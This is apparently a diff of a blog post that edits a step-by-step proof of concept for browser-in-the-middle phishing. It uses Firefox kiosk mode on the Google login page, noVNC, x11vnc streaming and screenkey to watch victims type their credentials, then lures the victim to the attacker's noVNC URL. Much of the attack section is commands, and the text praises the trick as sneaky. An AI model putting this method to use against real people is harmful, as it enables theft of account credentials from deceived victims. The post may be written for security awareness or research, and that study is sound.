@@ -50,27 +50,23 @@ Please note that the PoC demonstrated in this guide is not safe for "production"
 
 ---
 
-# PoC
+### PoC
 
-First we lachnge Firefox, or any other browser in kiosk mode.
+#### Firefox
 
-so, first what is kiosk mode?
+First, we launch Firefox or any other browser in kiosk mode with the website we want to phish. For this example, we will use Google accounts.
 
-Kiosk software is the system and user interface software designed for an interactive kiosk or Internet kiosk enclosing the system in a way that prevents user interaction and activities on the device outside the scope of execution of the netkiosk.
+Kiosk mode is a feature that can restrict user activities and interactions outside the intended scope of operation, this is necessary to prevent the victim from controlling other areas of our attacking machine, which may lead to unwanted access or control.
 
-Why do need kiosk mode?
-
-Without kiosk mode, the vicitim might be able to control other parts of our attacking machine, that we probarly dont want to happen.
-
-In the terminal, run:
+In the terminal, execute:
 
 ```bash
 firefox --kisok https://accounts.google.com
 ```
 
-Now in a new terminal window, we will use noVNC.
+#### noVNC
 
-noVNC is a VNC client library that can run on almost any browsers.
+Now, in a new terminal window, we will run a noVNC server:
 
 ```bash
 git clone https://github.com/novnc/noVNC
@@ -80,23 +76,35 @@ cd noVNC
 
 {% include figure.liquid loading="eager" path="assets/img/posts/2/2.png" class="img-fluid rounded z-depth-1" zoomable=true %}
 
-now we need to get the id of Firefox proccess running, we can use `xwininfo | grep` run this command and select the firefox browser, the terminal will print the id back.
+#### VNC
 
-After we have the id, we will star a local vnc server with:
+Now, we need to obtain the ID of the running Firefox process:
+
+1. Run `xwininfo | grep id` in the terminal
+2. Click on the Firefox window.
+3. In the terminal, the window ID will be displayed.
+
+{% include figure.liquid loading="eager" path="assets/img/posts/2/3.png" class="img-fluid rounded z-depth-1" zoomable=true %}
+
+Once we have obtained the window ID of Firefox using `xwininfo`, we can start a local VNC server by running:
 
 ```bash
 sudo apt update
 sudo apt install x11vnc
-x11vnc -id <firefox_window_id>
+x11vnc -id <window_id>
 ```
 
-Almost done! Now all left to do is use some kind keylogger, we can use `screenkey` to see key presses by the victim in real time, (note: it will also show our own key presses so please be aware):
+#### Keystroke Logger
+
+Once we have started the local VNC server, we can use the screenkey tool to view key presses by the victim in real time. It is important to note that screenkey will display our own key presses as well.
 
 ```
 sudo apt install screenkey -y
 screenkey
 ```
 
-Now all left to do is open up the the browser from the vicitm and enter the following url: `http://<ip>:8080/vnc.html?autoconnect=true`
+#### Victim
 
-When the vicitim will enter this url he will see the google accounts login page, without knowing it is a streaming video that he can interact with, this is crazy!
+Almost there! The last step is to have the victim open their browser and enter the following URL: `http://<ip>:8080/vnc.html?autoconnect=true`. Once they enter this URL, they will see what looks like the Google accounts login page. Little do they know, it's actually a live streaming video that they can interact with. It's a pretty sneaky and clever trick.
+
+{% include figure.liquid loading="eager" path="assets/img/posts/2/4.png" class="img-fluid rounded z-depth-1" zoomable=true %}
